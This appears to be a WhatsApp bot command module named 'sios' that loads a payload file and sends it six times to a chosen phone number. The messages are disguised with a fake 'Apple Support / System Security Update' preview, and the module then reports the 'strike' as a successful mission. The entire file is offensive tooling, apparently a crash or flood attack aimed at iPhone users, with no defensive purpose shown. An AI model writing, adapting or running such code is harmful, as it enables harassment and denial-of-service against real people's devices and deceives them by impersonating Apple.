const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "sios",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/sios.txt', 'utf-8');

        msg.reply(fancy("🥀 deploying ios special strike..."));

        for (let i = 0; i < 6; i++) {
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { 
                    externalAdReply: { title: "Apple Support", body: "System Security Update", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" },
                    forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                } 
            });
        }

        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SIOS Strike finished.") });
    }
};
